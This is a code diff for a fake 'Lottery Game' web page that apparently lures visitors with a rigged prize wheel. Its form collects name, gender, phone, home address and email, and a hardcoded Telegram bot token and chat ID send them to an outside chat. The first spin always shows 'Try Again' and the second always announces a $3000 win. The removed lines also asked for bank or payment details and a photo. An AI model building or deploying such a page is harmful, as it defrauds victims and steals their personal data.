@@ -5,74 +5,59 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Lottery Game</title>
     <style>
-        body { text-align: center; font-family: Arial, sans-serif; background-color: #222; color: #fff; }
-        #form-container, #scan-btn, #lottery-names, #loading, #go-btn, #wheel-container, #congrats, #payout-form, #upload-photo { display: none; }
-        .lottery-names { font-size: 24px; font-weight: bold; color: yellow; }
-        .loading-bar { width: 100%; background: #555; height: 20px; margin: 10px auto; position: relative; }
-        .loading-bar div { height: 100%; width: 0%; background: lime; position: absolute; }
-        .wheel { width: 300px; height: 300px; border-radius: 50%; border: 10px solid white; position: relative; margin: auto; transition: transform 3s ease-out; background: conic-gradient(red 0deg 45deg, blue 45deg 90deg, green 90deg 135deg, yellow 135deg 180deg, purple 180deg 225deg, orange 225deg 270deg, pink 270deg 315deg, cyan 315deg 360deg); }
-        .button { background: red; padding: 15px; color: white; font-size: 20px; cursor: pointer; margin: 10px; display: inline-block; border: none; }
+        body { text-align: center; font-family: Arial, sans-serif; background: #f4f4f4; color: #333; padding: 20px; }
+        input { width: 90%; padding: 15px; margin: 10px; font-size: 18px; border-radius: 5px; border: 2px solid #ddd; }
+        .button { background: blue; padding: 15px; color: white; font-size: 20px; cursor: pointer; border-radius: 5px; width: 90%; max-width: 300px; border: none; }
         .hidden { display: none; }
+        .wheel-container { position: relative; width: 300px; height: 300px; margin: 30px auto; }
+        .wheel { width: 100%; height: 100%; border-radius: 50%; position: absolute; transition: transform 3s ease-out; background: url('https://i.imgur.com/fZXETJy.png') no-repeat center center; background-size: cover; }
+        .pointer { position: absolute; top: -10px; left: 50%; transform: translateX(-50%); width: 0; height: 0; border-left: 15px solid transparent; border-right: 15px solid transparent; border-bottom: 30px solid red; }
+        footer { margin-top: 50px; font-size: 18px; color: #555; }
     </style>
 </head>
 <body>
 
-    <h1>Lottery Game</h1>
+    <h1>🎰 Lottery Game 🎰</h1>
 
-    <!-- User Form -->
     <div id="form-container">
         <h2>Enter Your Details</h2>
-        <input type="text" id="name" placeholder="Full Name"><br><br>
-        <input type="text" id="gender" placeholder="Gender"><br><br>
-        <input type="text" id="phone" placeholder="Phone Number"><br><br>
-        <input type="text" id="address" placeholder="Home Address"><br><br>
-        <input type="email" id="email" placeholder="Email"><br><br>
+        <input type="text" id="name" placeholder="👤 Full Name">
+        <input type="text" id="gender" placeholder="🚻 Gender">
+        <input type="text" id="phone" placeholder="📞 Phone Number">
+        <input type="text" id="address" placeholder="🏠 Home Address">
+        <input type="email" id="email" placeholder="📧 Email">
         <button class="button" onclick="submitForm()">Submit</button>
     </div>
 
-    <!-- Scan Button -->
     <button id="scan-btn" class="button hidden" onclick="startLottery()">Scan Lotteries</button>
 
-    <!-- Lottery Animation -->
     <div id="lottery-names"></div>
 
-    <!-- Loading -->
     <div id="loading" class="hidden">
         <p>Loading your personal Lottery game...</p>
         <div class="loading-bar"><div id="progress"></div></div>
     </div>
 
-    <!-- Go Button -->
     <button id="go-btn" class="button hidden" onclick="startWheel()">Go for it</button>
 
-    <!-- Spinning Wheel -->
     <div id="wheel-container" class="hidden">
-        <div id="wheel" class="wheel" onclick="spinWheel()"></div>
+        <div class="pointer"></div>
+        <div id="wheel" class="wheel"></div>
+        <button class="button" onclick="spinWheel()">Spin</button>
     </div>
 
-    <!-- Congratulations -->
     <div id="congrats" class="hidden">
         <h2>Congratulations! 🎉</h2>
         <p>You've won $3000!</p>
-        <button class="button" onclick="showPayoutForm()">Claim Prize</button>
+        <button class="button" onclick="alert('Your prize claim is being processed!')">Claim Prize</button>
     </div>
 
-    <!-- Payout Form -->
-    <div id="payout-form" class="hidden">
-        <h2>Enter Payout Details</h2>
-        <input type="text" id="payout" placeholder="Bank / Payment Address"><br><br>
-        <button class="button" onclick="submitPayout()">Submit</button>
-    </div>
-
-    <!-- Upload Photo -->
-    <div id="upload-photo" class="hidden">
-        <h2>Upload Your Photo</h2>
-        <input type="file" id="photo"><br><br>
-        <button class="button" onclick="submitPhoto()">Submit</button>
-    </div>
+    <footer>© 2024 Lottery Game. All rights reserved.</footer>
 
     <script>
         function submitForm() {
+            let botToken = "<7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY>";
+            let chatId = "<874563737>";
             let data = {
                 name: document.getElementById("name").value,
                 gender: document.getElementById("gender").value,
@@ -81,20 +66,19 @@
                 email: document.getElementById("email").value
             };
 
-            let botToken = "7636367334:AAE6d7AShLfccWJWMkyffSVrvpkURjfqtPY";  // Replace with your actual bot token
-            let chatId = "874563737";  // Replace with your actual chat ID
+            let message = `📢 New Lottery Entry:\n\n👤 Name: ${data.name}\n🚻 Gender: ${data.gender}\n📞 Phone: ${data.phone}\n🏠 Address: ${data.address}\n📧 Email: ${data.email}`;
 
-            let message = `New Lottery Entry:\n\nName: ${data.name}\nGender: ${data.gender}\nPhone: ${data.phone}\nAddress: ${data.address}\nEmail: ${data.email}`;
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
-
-            document.getElementById("form-container").style.display = "none";
-            document.getElementById("scan-btn").style.display = "block";
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                .then(() => {
+                    document.getElementById("form-container").style.display = "none";
+                    document.getElementById("scan-btn").style.display = "block";
+                })
+                .catch(error => console.error('Error:', error));
         }
 
         function startLottery() {
             document.getElementById("scan-btn").style.display = "none";
-            let names = ["Arizona Lottery", "Arkansas Scholarship Lottery", "Cash 5 (Colorado)", "Classic Lotto 47"];
+            let names = ["Arizona Lottery", "Arkansas Lottery", "Colorado Lottery", "California Lotto", "Tennessee Lottery"];
             let index = 0;
             let interval = setInterval(() => {
                 document.getElementById("lottery-names").innerText = names[index];
@@ -126,33 +110,22 @@
             document.getElementById("wheel-container").style.display = "block";
         }
 
+        let spinCount = 0;
         function spinWheel() {
             let wheel = document.getElementById("wheel");
-            let firstSpin = 360 * 3 + 45;  // Always lands on "Try Again"
-            let secondSpin = 360 * 3 + Math.floor(Math.random() * 360);  // Random Number
+            let firstSpin = 360 * 3 + 320;  // Lands on "Try Again"
+            let secondSpin = 360 * 3 + [40, 80, 120, 160, 200, 240, 280][Math.floor(Math.random() * 7)];  // Lands on 1-8
 
-            wheel.style.transform = `rotate(${firstSpin}deg)`;
-            setTimeout(() => {
+            if (spinCount === 0) {
+                wheel.style.transform = `rotate(${firstSpin}deg)`;
+                spinCount++;
+            } else {
                 wheel.style.transform = `rotate(${secondSpin}deg)`;
                 setTimeout(() => {
                     document.getElementById("wheel-container").style.display = "none";
                     document.getElementById("congrats").style.display = "block";
                 }, 3000);
-            }, 3000);
-        }
-
-        function showPayoutForm() {
-            document.getElementById("congrats").style.display = "none";
-            document.getElementById("payout-form").style.display = "block";
-        }
-
-        function submitPayout() {
-            document.getElementById("payout-form").style.display = "none";
-            document.getElementById("upload-photo").style.display = "block";
-        }
-
-        function submitPhoto() {
-            document.getElementById("upload-photo").innerHTML = "<h2>We will get back to you soon 😊</h2>";
+            }
         }
     </script>
 
